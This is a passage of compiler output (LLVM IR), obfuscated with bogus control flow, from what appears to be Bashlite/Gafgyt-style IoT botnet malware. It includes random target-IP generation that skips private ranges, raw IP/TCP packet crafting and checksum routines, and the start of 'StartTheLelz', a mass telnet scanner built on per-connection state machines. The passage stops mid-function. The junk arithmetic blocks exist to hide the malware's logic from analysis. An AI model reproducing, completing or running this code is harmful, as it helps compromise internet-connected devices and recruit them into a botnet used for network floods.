  %374 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %375 = zext i8 %374 to i32
  %376 = icmp sgt i32 %375, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %378 = zext i8 %377 to i32
  %379 = icmp slt i32 %378, 255
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %43
  %380 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %_ = sub i8 %380, 1
  %gen = mul i8 %_, 1
  %_7 = shl i8 %380, 1
  %_8 = sub i8 %380, 1
  %gen9 = mul i8 %_8, 1
  %_10 = sub i8 %380, 1
  %gen11 = mul i8 %_10, 1
  %_12 = shl i8 %380, 1
  %_13 = sub i8 %380, 1
  %gen14 = mul i8 %_13, 1
  %_15 = sub i8 0, %380
  %gen16 = add i8 %_15, 1
  %381 = add i8 %380, 1
  store i8 %381, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %382 = bitcast [16 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %382, i8 0, i64 16, i32 16, i1 false)
  %383 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %384 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %385 = zext i8 %384 to i32
  %386 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %387 = zext i8 %386 to i32
  %388 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %389 = zext i8 %388 to i32
  %390 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %391 = zext i8 %390 to i32
  %392 = call i32 (i8*, i8*, ...) @szprintf(i8* %383, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i32 0, i32 0), i32 %385, i32 %387, i32 %389, i32 %391)
  %393 = getelementptr inbounds [16 x i8], [16 x i8]* %10, i32 0, i32 0
  %394 = call i32 @inet_addr(i8* %393) #4
  store i32 %394, i32* %9, align 4
  br label %originalBB6

originalBB20alteredBB:                            ; preds = %originalBB20, %75
  %395 = call i32 @rand() #4
  %_21 = sub i32 %395, 255
  %gen22 = mul i32 %_21, 255
  %_23 = shl i32 %395, 255
  %_24 = sub i32 %395, 255
  %gen25 = mul i32 %_24, 255
  %_26 = sub i32 0, %395
  %gen27 = add i32 %_26, 255
  %_28 = sub i32 0, %395
  %gen29 = add i32 %_28, 255
  %_30 = shl i32 %395, 255
  %_31 = shl i32 %395, 255
  %_32 = sub i32 %395, 255
  %gen33 = mul i32 %_32, 255
  %396 = srem i32 %395, 255
  %397 = trunc i32 %396 to i8
  store i8 %397, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %398 = call i32 @rand() #4
  %_34 = sub i32 0, %398
  %gen35 = add i32 %_34, 255
  %_36 = shl i32 %398, 255
  %_37 = sub i32 %398, 255
  %gen38 = mul i32 %_37, 255
  %_39 = shl i32 %398, 255
  %_40 = shl i32 %398, 255
  %399 = srem i32 %398, 255
  %400 = trunc i32 %399 to i8
  store i8 %400, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %401 = call i32 @rand() #4
  %_41 = sub i32 0, %401
  %gen42 = add i32 %_41, 255
  %_43 = shl i32 %401, 255
  %_44 = shl i32 %401, 255
  %_45 = sub i32 %401, 255
  %gen46 = mul i32 %_45, 255
  %_47 = shl i32 %401, 255
  %_48 = sub i32 0, %401
  %gen49 = add i32 %_48, 255
  %402 = srem i32 %401, 255
  %403 = trunc i32 %402 to i8
  store i8 %403, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %originalBB20

originalBB53alteredBB:                            ; preds = %originalBB53, %101
  %404 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 0
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %121
  %407 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %408 = zext i8 %407 to i32
  %409 = icmp eq i32 %408, 10
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %141
  %410 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %411 = zext i8 %410 to i32
  %412 = icmp eq i32 %411, 100
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %173
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 169
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %201
  %416 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %417 = zext i8 %416 to i32
  %418 = icmp sle i32 %417, 16
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %265
  %419 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %420 = zext i8 %419 to i32
  %421 = icmp eq i32 %420, 19
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %289
  %422 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %423 = zext i8 %422 to i32
  %424 = icmp eq i32 %423, 51
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %317
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 0
  br label %originalBB81
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.57
  %3 = load i32, i32* @y.58
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #13
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.57
  %23 = load i32, i32* @y.58
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #13
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = sub i32 0, %33
  %gen = add i32 %_1, %34
  %_2 = sub i32 %33, %34
  %gen3 = mul i32 %_2, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_4 = sub i32 0, %38
  %gen5 = add i32 %_4, -1
  %39 = xor i32 %38, -1
  %_6 = sub i32 %37, %39
  %gen7 = mul i32 %_6, %39
  %40 = and i32 %37, %39
  %_8 = sub i32 %36, %40
  %gen9 = mul i32 %_8, %40
  %_10 = sub i32 0, %36
  %gen11 = add i32 %_10, %40
  %_12 = shl i32 %36, %40
  %_13 = sub i32 %36, %40
  %gen14 = mul i32 %_13, %40
  %_15 = shl i32 %36, %40
  %_16 = sub i32 %36, %40
  %gen17 = mul i32 %_16, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %originalBBpart2, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %55

; <label>:33:                                     ; preds = %29
  %34 = load i32, i32* @x.59
  %35 = load i32, i32* @y.60
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i64, i64* %5, align 8
  %43 = and i64 %42, 65535
  %44 = load i64, i64* %5, align 8
  %45 = lshr i64 %44, 16
  %46 = add i64 %43, %45
  store i64 %46, i64* %5, align 8
  %47 = load i32, i32* @x.59
  %48 = load i32, i32* @y.60
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %29

; <label>:55:                                     ; preds = %29
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = trunc i64 %57 to i16
  ret i16 %58

originalBBalteredBB:                              ; preds = %originalBB, %33
  %59 = load i64, i64* %5, align 8
  %_ = sub i64 %59, 65535
  %gen = mul i64 %_, 65535
  %_1 = shl i64 %59, 65535
  %_2 = sub i64 0, %59
  %gen3 = add i64 %_2, 65535
  %_4 = sub i64 %59, 65535
  %gen5 = mul i64 %_4, 65535
  %60 = and i64 %59, 65535
  %61 = load i64, i64* %5, align 8
  %_6 = sub i64 0, %61
  %gen7 = add i64 %_6, 16
  %_8 = shl i64 %61, 16
  %_9 = sub i64 %61, 16
  %gen10 = mul i64 %_9, 16
  %62 = lshr i64 %61, 16
  %_11 = sub i64 0, %60
  %gen12 = add i64 %_11, %62
  %_13 = sub i64 0, %60
  %gen14 = add i64 %_13, %62
  %_15 = shl i64 %60, %62
  %_16 = sub i64 0, %60
  %gen17 = add i64 %_16, %62
  %_18 = shl i64 %60, %62
  %_19 = sub i64 0, %60
  %gen20 = add i64 %_19, %62
  %_21 = sub i64 %60, %62
  %gen22 = mul i64 %_21, %62
  %63 = add i64 %60, %62
  store i64 %63, i64* %5, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #4
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #4
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #1

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.65
  %3 = load i32, i32* @y.66
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.65
  %15 = load i32, i32* @y.66
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %39

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.65
  %24 = load i32, i32* @y.66
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  store i32 1, i32* %10, align 4
  %31 = load i32, i32* @x.65
  %32 = load i32, i32* @y.66
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %58

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* @x.65
  %41 = load i32, i32* @y.66
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %39
  %48 = load i32, i32* %11, align 4
  %49 = call i32 @close(i32 %48)
  store i32 0, i32* %10, align 4
  %50 = load i32, i32* @x.65
  %51 = load i32, i32* @y.66
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %58

; <label>:58:                                     ; preds = %originalBBpart28, %originalBBpart24
  %59 = load i32, i32* @x.65
  %60 = load i32, i32* @y.66
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %58
  %67 = load i32, i32* %10, align 4
  %68 = load i32, i32* @x.65
  %69 = load i32, i32* @y.66
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %67

originalBBalteredBB:                              ; preds = %originalBB, %1
  %76 = alloca i32, align 4
  %77 = alloca i32, align 4
  store i32 %0, i32* %77, align 4
  %78 = load i32, i32* %77, align 4
  %79 = icmp sgt i32 3, %78
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  store i32 1, i32* %10, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %39
  %80 = load i32, i32* %11, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %10, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %58
  %82 = load i32, i32* %10, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = load i32, i32* @x.67
  %2 = load i32, i32* @y.68
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = call i32 @getdtablesize() #4
  %22 = sdiv i32 %21, 4
  %23 = mul nsw i32 %22, 3
  store i32 %23, i32* %9, align 4
  %24 = load i32, i32* %9, align 4
  %25 = icmp sgt i32 %24, 4096
  %26 = load i32, i32* @x.67
  %27 = load i32, i32* @y.68
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %35

; <label>:34:                                     ; preds = %originalBBpart2
  br label %37

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %9, align 4
  br label %37

; <label>:37:                                     ; preds = %35, %34
  %38 = phi i32 [ 4096, %34 ], [ %36, %35 ]
  store i32 %38, i32* %9, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = call zeroext i16 @htons(i16 zeroext 23) #13
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %43 = getelementptr inbounds [8 x i8], [8 x i8]* %42, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 8, i32 4, i1 false)
  %44 = load i32, i32* %9, align 4
  %45 = zext i32 %44 to i64
  %46 = call i8* @llvm.stacksave()
  store i8* %46, i8** %17, align 8
  %47 = alloca %struct.telstate_t, i64 %45, align 16
  %48 = bitcast %struct.telstate_t* %47 to i8*
  %49 = load i32, i32* %9, align 4
  %50 = sext i32 %49 to i64
  %51 = mul i64 %50, 5
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 %51, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %37
  %53 = load i32, i32* %10, align 4
  %54 = load i32, i32* %9, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %74

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* %10, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = call noalias i8* @malloc(i64 1024) #4
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 8
  store i8* %61, i8** %65, align 8
  %66 = load i32, i32* %10, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %67
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %68, i32 0, i32 8
  %70 = load i8*, i8** %69, align 8
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 1024, i32 1, i1 false)
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %10, align 4
  br label %52

; <label>:74:                                     ; preds = %52
  %75 = load i32, i32* @x.67
  %76 = load i32, i32* @y.68
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = load i32, i32* @x.67
  %84 = load i32, i32* @y.68
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %91

; <label>:91:                                     ; preds = %1873, %originalBBpart24
  br label %92

; <label>:92:                                     ; preds = %91
  store i32 0, i32* %10, align 4
  br label %93

; <label>:93:                                     ; preds = %1870, %92
  %94 = load i32, i32* %10, align 4
  %95 = load i32, i32* %9, align 4
  %96 = icmp slt i32 %94, %95
  br i1 %96, label %97, label %1873

; <label>:97:                                     ; preds = %93
  %98 = load i32, i32* %10, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 2
  %102 = load i8, i8* %101, align 8
  %103 = zext i8 %102 to i32
  switch i32 %103, label %1869 [
    i32 0, label %104
    i32 1, label %359
    i32 2, label %563
    i32 3, label %682
    i32 4, label %766
    i32 5, label %1002
    i32 6, label %1118
    i32 7, label %1278
    i32 8, label %1322
    i32 9, label %1366
    i32 10, label %1442
    i32 100, label %1606
    i32 101, label %1634
    i32 102, label %1694
    i32 103, label %1722
  ]

; <label>:104:                                    ; preds = %97
